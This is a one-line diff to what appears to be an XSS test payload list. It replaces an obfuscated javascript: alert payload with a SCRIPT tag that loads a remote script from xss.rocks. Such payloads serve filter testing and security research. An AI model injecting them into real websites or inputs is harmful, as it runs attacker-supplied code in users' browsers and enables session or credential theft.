@@ -1,1 +1,1 @@
-<IMG SRC=" &#14;  javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
